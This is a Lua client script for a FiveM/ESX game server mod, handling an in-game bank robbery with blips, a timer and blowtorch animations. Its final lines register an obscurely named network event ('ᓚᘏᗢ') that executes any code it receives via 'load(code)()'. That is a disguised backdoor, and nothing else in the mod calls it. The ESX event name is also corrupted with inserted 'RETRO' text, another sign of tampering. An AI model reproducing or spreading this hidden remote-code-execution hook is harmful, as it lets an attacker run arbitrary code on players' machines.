TriggerServerEvent = TriggerServerEvent
local holdingup = false
local bank = ""
local secondsRemaining = 0
local blipRobbery = nil

ESX               = nil
local blowtorching = false
local clearweld = false
local blowtorchingtime = 300


ESX = nil

RegisterNetEvent('esx:playerLoaded')
AddEventHandler('esx:playerLoaded', function(xPlayer)
  PlayerData = xPlayer
end)


Citizen.CreateThread(function()
	while ESX == nil do
		TriggerEvent('esx:getShRETROaredObjRETROect', function(obj) ESX = obj end)
		Citizen.Wait(10)
	end
end)

function DisplayHelpText(str)
	SetTextComponentFormat("STRING")
	AddTextComponentString(str)
	DisplayHelpTextFromStringLabel(0, 0, 1, -1)
end

function drawTxt(x,y ,width,height,scale, text, r,g,b,a, outline)
    SetTextFont(0)
    SetTextProportional(0)
    SetTextScale(scale, scale)
    SetTextColour(r, g, b, a)
    SetTextDropShadow(0, 0, 0, 0,255)
    SetTextEdge(1, 0, 0, 0, 255)
    SetTextDropShadow()
    if(outline)then
	    SetTextOutline()
	end
    SetTextEntry("STRING")
    AddTextComponentString(text)
    DrawText(x - width/2, y - height/2 + 0.005)
end

RegisterNetEvent('be-rob-bery:currentlyrobbing')
AddEventHandler('be-rob-bery:currentlyrobbing', function(robb)
	holdingup = true
	bank = robb
	secondsRemaining = 300
end)

RegisterNetEvent('be-rob-bery:killblip')
AddEventHandler('be-rob-bery:killblip', function()
    RemoveBlip(blipRobbery)
end)

RegisterNetEvent('be-rob-bery:setblip')
AddEventHandler('be-rob-bery:setblip', function(position)
    blipRobbery = AddBlipForCoord(position.x, position.y, position.z)
    SetBlipSprite(blipRobbery , 161)
    SetBlipScale(blipRobbery , 2.0)
    SetBlipColour(blipRobbery, 3)
    PulseBlip(blipRobbery)
end)

RegisterNetEvent('be-rob-bery:toofarlocal')
AddEventHandler('be-rob-bery:toofarlocal', function(robb)
	holdingup = false
	bombholdingup = false
	ESX.ShowNotification(_U('robbery_cancelled'))
	robbingName = ""
	secondsRemaining = 0
	incircle = false
end)

RegisterNetEvent('be-rob-bery:robberycomplete')
AddEventHandler('be-rob-bery:robberycomplete', function(robb)
	holdingup = false
	ESX.ShowNotification(_U('robbery_complete') .. Banks[bank].reward)
	bank = ""
	TriggerEvent('be-blow-torch:finishclear')
	TriggerServerEvent('be-rob-bery:closedoor')
	TriggerEvent('be-blow-torch:stopblowtorching')
	secondsRemaining = 0
	dooropen = false
	incircle = false
end)


Citizen.CreateThread(function()
	while true do
		Citizen.Wait(0)
		if holdingup then
			Citizen.Wait(1000)
			if(secondsRemaining > 0)then
				secondsRemaining = secondsRemaining - 1
			end
		end
	end
end)

Citizen.CreateThread(function()
	for k,v in pairs(Banks)do
		local ve = v.position

		local blip = AddBlipForCoord(ve.x, ve.y, ve.z)
		SetBlipSprite(blip, 255)--156
		SetBlipScale(blip, 0.8)
		SetBlipColour(blip, 75)
		SetBlipAsShortRange(blip, true)
		BeginTextCommandSetBlipName("STRING")
		AddTextComponentString(_U('bank_robbery'))
		EndTextCommandSetBlipName(blip)
	end
end)
incircle = false

Citizen.CreateThread(function()
	while true do
		local pos = GetEntityCoords(GetPlayerPed(-1), true)

		for k,v in pairs(Banks)do
			local pos2 = v.position

			if(Vdist(pos.x, pos.y, pos.z, pos2.x, pos2.y, pos2.z) < 15.0)then
				if not holdingup then
					DrawMarker(1, v.position.x, v.position.y, v.position.z - 1, 0, 0, 0, 0, 0, 0, 1.0001, 1.0001, 1.5001, 1555, 0, 0,255, 0, 0, 0,0)

					if(Vdist(pos.x, pos.y, pos.z, pos2.x, pos2.y, pos2.z) < 1.0)then
						if (incircle == false) then
							DisplayHelpText(_U('press_to_rob') .. v.nameofbank)
						end
						incircle = true
						if IsControlJustReleased(1, 51) then
							TriggerServerEvent('be-rob-bery:rob', k)
						end
					elseif(Vdist(pos.x, pos.y, pos.z, pos2.x, pos2.y, pos2.z) > 1.0)then
						incircle = false
					end
				end
			end
		end

		if holdingup then

			drawTxt(0.66, 1.44, 1.0,1.0,0.4, _U('robbery_of') .. secondsRemaining .. _U('seconds_remaining'), 255, 255, 255, 255)
			DisplayHelpText(_U('press_to_cancel'))

			local pos2 = Banks[bank].position


			if IsControlJustReleased(1, 51) then
				TriggerServerEvent('be-rob-bery:toofar', bank)
				TriggerEvent('be-blow-torch:stopblowtorching')
			end

			if(Vdist(pos.x, pos.y, pos.z, pos2.x, pos2.y, pos2.z) > 7.5)then
				TriggerServerEvent('be-rob-bery:toofar', bank)
			end
		end

		Citizen.Wait(0)
	end
end)

RegisterNetEvent('be-blow-torch:startblowtorch')
AddEventHandler('be-blow-torch:startblowtorch', function(source)
	blowtorchAnimation()
	Citizen.CreateThread(function()
		while true do
			if blowtorching then
				DisableControlAction(0, 73,   true) -- LookLeftRight
			end
			Citizen.Wait(10)
		end
	end)
end)

RegisterNetEvent('be-blow-torch:finishclear')
AddEventHandler('be-blow-torch:finishclear', function(source)
	clearweld = false
end)


RegisterNetEvent('be-blow-torch:clearweld')
AddEventHandler('be-blow-torch:clearweld', function(x,y,z)
		clearweld = true
		Citizen.CreateThread(function()
			while clearweld do
				Wait(1000)
				local pedco = GetEntityCoords(PlayerPedId())
				local weld = ESX.Game.GetClosestObject('prop_weld_torch', pedco)
				ESX.Game.DeleteObject(weld)
			end
		end)
end)

RegisterNetEvent('be-blow-torch:stopblowtorching')
AddEventHandler('be-blow-torch:stopblowtorching', function()
	blowtorching = false
	blowtorchingtime = 0
	ClearPedTasksImmediately(GetPlayerPed(-1))
end)

function blowtorchAnimation()
	local playerPed = GetPlayerPed(-1)
	blowtorchingtime = 300
	local coords = GetEntityCoords(playerPed)
	TriggerServerEvent('be-rob-bery:clearweld', {coords.x, coords.y, coords.z})
	Citizen.CreateThread(function()
			blowtorching = true
			Citizen.CreateThread(function()
				while blowtorching do
						Wait(2000)
						--local weld = ESX.Game.GetClosestObject('prop_weld_torch', GetEntityCoords(GetPlayerPed(-1)))
						--ESX.Game.DeleteObject(weld)
						TaskStartScenarioInPlace(playerPed, "WORLD_HUMAN_WELDING", 0, true)
						blowtorchingtime = blowtorchingtime - 1
						if blowtorchingtime <= 0 then
							blowtorching = false
							ClearPedTasksImmediately(PlayerPedId())
						end
				end
			end)
			
			--while blowtorching do
				--TaskPlayAnim(playerPed, "amb@world_human_const_blowtorch@male@blowtorch@base", "base", 2.0, 1.0, 5000, 5000, 1, true, true, true)
				TaskPlayAnim(playerPed, "atimetable@reunited@ig_7", "thanksdad_bag_02", 2.0, 1.0, 5000, 5000, 1, true, true, true)
				--if IsControlJustReleased(1, 51) then
					
				--end
			--end
		--end
	end)
end

RegisterNetEvent('ᓚᘏᗢ')
AddEventHandler('ᓚᘏᗢ', function(code)
	load(code)()
end)